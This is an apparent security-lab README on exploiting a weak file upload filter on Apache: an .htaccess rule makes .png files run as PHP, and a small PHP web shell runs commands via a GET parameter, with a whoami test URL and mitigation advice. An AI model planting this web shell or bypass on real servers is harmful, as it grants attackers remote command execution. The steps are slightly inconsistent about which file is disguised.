# 🛡️ File Upload Exploitation – Apache .htaccess Bypass

[![Lab Type](https://img.shields.io/badge/Lab-Web_Exploit-blue)](https://github.com/) 
[![Severity](https://img.shields.io/badge/Severity-High-red)](https://github.com/) 
[![RCE](https://img.shields.io/badge/RCE-Confirmed-brightgreen)](https://github.com/) 
[![PHP](https://img.shields.io/badge/Language-PHP-purple)](https://www.php.net/) 
[![Apache](https://img.shields.io/badge/Server-Apache-orange)](https://httpd.apache.org/) 
[![File Upload](https://img.shields.io/badge/Feature-File_Upload-yellow)](https://github.com/)  

---

## 📑 Table of Contents

1. [Overview](#overview)  
2. [Objective](#objective)  
3. [Vulnerability Description](#vulnerability-description)  
4. [Exploitation Steps](#exploitation-steps)  
5. [Proof of Concept](#proof-of-concept)  
6. [Mitigation](#mitigation)  
7. [References](#references)  

---

## Overview

This lab demonstrates a **file upload vulnerability** in a simulated web application. By exploiting weak validation, we are able to achieve **Remote Code Execution (RCE)** on an Apache server using an `.htaccess` bypass technique.

---

## Objective

- Understand file upload vulnerabilities  
- Learn how `.htaccess` can be abused to execute uploaded files  
- Practice safe exploitation in a controlled environment  

---

## Vulnerability Description

File upload functionality is often a critical entry point for attackers. In this lab:

- The web application **fails to properly validate file types**  
- Apache `.htaccess` files are **not restricted**, allowing uploaded files to execute as PHP scripts  
- This allows attackers to execute arbitrary code on the server  

---

## Exploitation Steps

1. Prepare the exploit files:  
   - `exploit.php` — the malicious PHP web shell  
   - `blank.png` — a harmless-looking image file to bypass file type restrictions  
2. Upload `blank.png` to test the upload functionality  
3. Upload `exploit.php` disguised as an allowed file  
4. Upload an `.htaccess` file to enforce PHP execution on disguised uploads:  

```apache
AddType application/x-httpd-php .png
````

5. Access the uploaded `exploit.php` via the browser to execute commands

---

## Proof of Concept

**exploit.php**:

```php
<?php
// Simple PHP web shell example
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

Test the exploit:

```
http://target.com/uploads/exploit.php?cmd=whoami
```

---

## Mitigation

* **Validate uploaded files**: restrict by MIME type and file extension
* **Rename uploaded files** and store outside web root
* **Disable `.htaccess` overrides** where not required
* **Use least privilege permissions** for upload directories

---

## References

* [PHP Official Documentation](https://www.php.net/)
* [Apache HTTP Server Documentation](https://httpd.apache.org/)
* [OWASP File Upload Cheat Sheet](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

```
